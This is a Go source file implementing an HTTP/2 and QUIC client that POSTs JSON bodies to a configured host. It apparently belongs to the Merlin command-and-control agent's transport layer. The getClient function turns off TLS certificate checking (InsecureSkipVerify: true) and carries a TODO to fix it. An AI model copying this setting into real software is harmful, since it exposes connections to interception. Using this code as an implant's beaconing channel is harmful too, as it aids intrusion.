package http2

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"time"

	"github.com/fatih/color"
	"golang.org/x/net/http2"

	"github.com/Ne0nd0g/merlin/pkg/transport"
	"github.com/lucas-clemente/quic-go"
	"github.com/lucas-clemente/quic-go/h2quic"
)

type HTTP2CommClient struct {
	client    *http.Client
	userAgent string
	host      string
}

func New(proto, host, userAgent string) HTTP2CommClient {
	r := HTTP2CommClient{}
	c, err := getClient(proto)
	if err != nil {
		message("warn", "client creation error: "+err.Error())
	}
	r.client = c
	r.userAgent = userAgent
	r.host = host

	return r
}

func (h HTTP2CommClient) Do(b io.Reader) (transport.MerlinResponse, error) {
	req, reqErr := http.NewRequest("POST", h.host, b)
	if reqErr != nil {
		return transport.MerlinResponse{}, reqErr
	}
	req.Header.Set("User-Agent", h.userAgent)
	req.Header.Set("Content-Type", "application/json; charset=utf-8")

	res, err := h.client.Do(req)
	if err != nil || res.StatusCode != http.StatusOK {
		if err != nil {
			return transport.MerlinResponse{}, err
		}
		return transport.MerlinResponse{}, fmt.Errorf("Bad status code: %d", res.StatusCode)
	}

	return transport.MerlinResponse{
		Body:    res.Body,
		BodyLen: res.ContentLength,
	}, nil

}

func message(level string, message string) {
	switch level {
	case "info":
		color.Cyan("[i]" + message)
	case "note":
		color.Yellow("[-]" + message)
	case "warn":
		color.Red("[!]" + message)
	case "debug":
		color.Red("[DEBUG]" + message)
	case "success":
		color.Green("[+]" + message)
	default:
		color.Red("[_-_]Invalid message level: " + message)
	}
}

// getClient returns a HTTP client for the passed in protocol (i.e. h2 or hq)
func getClient(protocol string) (*http.Client, error) {

	/* #nosec G402 */
	// G402: TLS InsecureSkipVerify set true. (Confidence: HIGH, Severity: HIGH) Allowed for testing
	// Setup TLS configuration
	TLSConfig := &tls.Config{
		MinVersion:         tls.VersionTLS12,
		InsecureSkipVerify: true, // #nosec G402 - see https://github.com/Ne0nd0g/merlin/issues/59 TODO fix this
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
		},
		NextProtos: []string{protocol},
	}

	if protocol == "hq" {
		transport := &h2quic.RoundTripper{
			QuicConfig:      &quic.Config{IdleTimeout: 168 * time.Hour},
			TLSClientConfig: TLSConfig,
		}
		return &http.Client{Transport: transport}, nil
	} else if protocol == "h2" {
		transport := &http2.Transport{
			TLSClientConfig: TLSConfig,
		}
		return &http.Client{Transport: transport}, nil
	}
	return nil, fmt.Errorf("%s is not a valid client protocol", protocol)
}
